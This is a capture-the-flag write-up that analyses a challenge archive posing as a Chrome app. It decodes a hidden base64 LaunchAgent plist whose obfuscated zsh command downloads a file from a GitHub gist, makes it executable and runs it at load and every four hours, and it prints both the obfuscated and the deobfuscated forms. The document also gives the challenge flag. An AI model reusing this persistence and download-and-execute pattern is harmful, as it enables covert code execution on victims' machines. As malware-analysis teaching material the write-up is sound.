# Welcome the the Park

## Description
```
The creator of Jurassic Park is in hiding... amongst Mach-O files, apparently. Can you find him? 

Provided Files: welcomeToThePark.zip
```

## Writeup

Starting off I unziped the archive and took a look at its contents. <br/>
```sh
kali@kali ls -la -R welcome
welcome:
total 28
drwxr-xr-x 4 root root 4096 Sep 27 20:27 .
drwxr-xr-x 4 root root 4096 Oct 21 15:00 ..
-rw-r--r-- 1 root root 8196 Sep 27 22:49 .DS_Store
drwxr-xr-x 2 root root 4096 Sep 27 23:04 .hidden
drwxr-xr-x 3 root root 4096 Sep 27 20:41 Chrome.app

welcome/.hidden:
total 44
drwxr-xr-x 2 root root  4096 Sep 27 23:04 .
drwxr-xr-x 4 root root  4096 Sep 27 20:27 ..
-rwxr-xr-x 1 root root 33608 Sep 27 23:03 welcomeToThePark

welcome/Chrome.app:
total 52
drwxr-xr-x 3 root root  4096 Sep 27 20:41 .
drwxr-xr-x 4 root root  4096 Sep 27 20:27 ..
drwxr-xr-x 4 root root  4096 Sep 27 20:18 Contents
-rw-r--r-- 1 root root 39984 Sep 27 20:16 FlashPlayer.ico
-rw-r--r-- 1 root root     0 Sep 27 20:18 Icon

welcome/Chrome.app/Contents:
total 24
drwxr-xr-x 4 root root 4096 Sep 27 20:18 .
drwxr-xr-x 3 root root 4096 Sep 27 20:41 ..
-rw-r--r-- 1 root root 2645 Sep 27 20:18 Info.plist
drwxr-xr-x 2 root root 4096 Sep 27 20:18 MacOS
-rw-r--r-- 1 root root    8 Sep 27 20:18 PkgInfo
drwxr-xr-x 4 root root 4096 Sep 27 20:27 Resources

welcome/Chrome.app/Contents/MacOS:
total 108
drwxr-xr-x 2 root root  4096 Sep 27 20:18 .
drwxr-xr-x 4 root root  4096 Sep 27 20:18 ..
-rwxr-xr-x 1 root root 99064 Sep 27 20:18 applet

welcome/Chrome.app/Contents/Resources:
total 96
drwxr-xr-x 4 root root  4096 Sep 27 20:27 .
drwxr-xr-x 4 root root  4096 Sep 27 20:18 ..
drwxr-xr-x 2 root root  4096 Sep 27 20:18 Scripts
-rw-r--r-- 1 root root 71867 Sep 27 20:18 applet.icns
-rw-r--r-- 1 root root   362 Sep 27 20:18 applet.rsrc
drwxr-xr-x 2 root root  4096 Sep 27 20:18 description.rtfd
-rwxr-xr-x 1 root root    61 Sep 27 20:27 interesting_thing.command

welcome/Chrome.app/Contents/Resources/Scripts:
total 12
drwxr-xr-x 2 root root 4096 Sep 27 20:18 .
drwxr-xr-x 4 root root 4096 Sep 27 20:27 ..
-rw-r--r-- 1 root root  654 Sep 27 20:18 main.scpt

welcome/Chrome.app/Contents/Resources/description.rtfd:
total 12
drwxr-xr-x 2 root root 4096 Sep 27 20:18 .
drwxr-xr-x 4 root root 4096 Sep 27 20:27 ..
-rw-r--r-- 1 root root  144 Sep 27 20:18 TXT.rtf
```

Although I saw a lot of different files what cought my interest was the `.hidden` directory. <br/>
Taking a look at the file inside I was able to determine that it's an executable. <br/>
```sh
kali@kali file welcomeToThePark 
welcomeToThePark: Mach-O 64-bit arm64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>

kali@kali strings welcomeToThePark

----------------------
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgcGxpc3QgUFVCTElDICItLy9BcHBsZS8vRFREIFBMSVNUIDEuMC8vRU4iICJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkIj48cGxpc3QgdmVyc2lvbj0iMS4wIj48ZGljdD48a2V5PkxhYmVsPC9rZXk+PHN0cmluZz5jb20uaHVudHJlc3MuY3RmPC9zdHJpbmc+PGtleT5Qcm9ncmFtQXJndW1lbnRzPC9rZXk+PGFycmF5PjxzdHJpbmc+L2Jpbi96c2g8L3N0cmluZz48c3RyaW5nPi1jPC9zdHJpbmc+PHN0cmluZz5BMGI9J3RtcD0iJChtJztBMGJFUmhlWj0na3RlbXAgL3RtcC9YWCc7QTBiRVJoZVpYPSdYWFhYWFgpIic7QTBiRVI9JzsgY3VybCAtLSc7QTBiRT0ncmV0cnkgNSAtZiAnO0EwYkVSaD0nImh0dHBzOi8vJztBMGJFUmhlWlhEUmk9J2dpc3QuZ2l0aHUnO3hiRVI9J2IuY29tL3MnO2p1dVE9J3R1YXJ0amFzJztqdXVRUTdsN1g1PSdoL2E3ZDE4JztqdXVRUTdsN1g1eVg9JzdjNDRmNDMyNyc7anV1UVE3bDdYNXk9JzczOWI3NTJkMDM3YmU0NWYwMSc7anV1UVE3PSciIC1vICIke3RtcH0iOyBpJztqdXVRUTdsNz0nZiBbWyAtcyAiJHt0bXB9JztqdXVRUTdsN1g9JyIgXV07JztqdVFRN2w3WDV5PScgdGhlbiBjaG0nO2p1UVE3bD0nb2QgNzc3ICIke3RtcH0iOyAnO3pSTzNPVXRjWHQ9JyIke3RtcH0iJzt6Uk8zT1V0PSc7IGZpOyBybSc7elJPM09VdGNYdGVCPScgIiR7dG1wfSInO2VjaG8gLWUgJHtBMGJ9JHtBMGJFUmhlWn0ke0EwYkVSaGVaWH0ke0EwYkVSfSR7QTBiRX0ke0EwYkVSaH0ke0EwYkVSaGVaWERSaX0ke3hiRVJ9JHtqdXVRfSR7anV1UVE3bDdYNX0ke2p1dVFRN2w3WDV5WH0ke2p1dVFRN2w3WDV5fSR7anV1UVE3fSR7anV1UVE3bDd9JHtqdXVRUTdsN1h9JHtqdVFRN2w3WDV5fSR7anVRUTdsfSR7elJPM09VdGNYdH0ke3pSTzNPVXR9JHt6Uk8zT1V0Y1h0ZUJ9IHwgL2Jpbi96c2g8L3N0cmluZz48L2FycmF5PjxrZXk+UnVuQXRMb2FkPC9rZXk+PHRydWUgLz48a2V5PlN0YXJ0SW50ZXJ2YWw8L2tleT48aW50ZWdlcj4xNDQwMDwvaW50ZWdlcj48L2RpY3Q+PC9wbGlzdD4=
----------------------
```

Seems like there is a base64 string in the executable. <br/>
Decoing the strings outputs the following: <br/>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.huntress.ctf</string>
<key>ProgramArguments</key>
<array>
<string>/bin/zsh</string>
<string>-c</string>
<string>A0b='tmp="$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='" -o "${tmp}"; i';juuQQ7l7='f [[ -s "${tmp}';juuQQ7l7X='" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 "${tmp}"; ';zRO3OUtcXt='"${tmp}"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' "${tmp}"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh</string>
</array>
<key>RunAtLoad</key>
<true />
<key>StartInterval</key>
<integer>14400</integer>
</dict></plist>
```

Deobfuscating process: <br/>
```sh
A0b='tmp="$(m';
A0bERheZ='ktemp /tmp/XX';
A0bERheZX='XXXXXX)"';
A0bER='; curl --';
A0bE='retry 5 -f ';
A0bERh='"https://';
A0bERheZXDRi='gist.githu';
xbER='b.com/s';
juuQ='tuartjas';
juuQQ7l7X5='h/a7d18';
juuQQ7l7X5yX='7c44f4327';
juuQQ7l7X5y='739b752d037be45f01';
juuQQ7='" -o "${tmp}"; i';
juuQQ7l7='f [[ -s "${tmp}';
juuQQ7l7X='" ]];';
juQQ7l7X5y=' then chm';
juQQ7l='od 777 "${tmp}"; '
;zRO3OUtcXt='"${tmp}"';
zRO3OUt='; fi; rm';
zRO3OUtcXteB=' "${tmp}"';

echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh
```

After splitting up the code I got a better picture of the content. <br/>
```sh
echo -e tmp="$(mktemp /tmp/XXXXXXXX)"; 
curl --retry 5 -f "https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01" -o "${tmp}"; 

if [[ -s "${tmp}" ]]; 
    then chmod 777 "${tmp}"; 
    "${tmp}"; 
fi; 
rm "${tmp}" | /bin/zsh
```

After deobfuscating this I got a URL `https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01`. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/50a5d993-b633-4d7b-b472-24abb2ad9921)

Accessing the URL I found a picture. <br/>
Inspecting the picture: <br/>
```sh
kali@kali strings JohnHammond.jpg

---------------------------------
flag{680b736565c76941a364775f06383466}
```

Like this I got the flag for this short challenge.



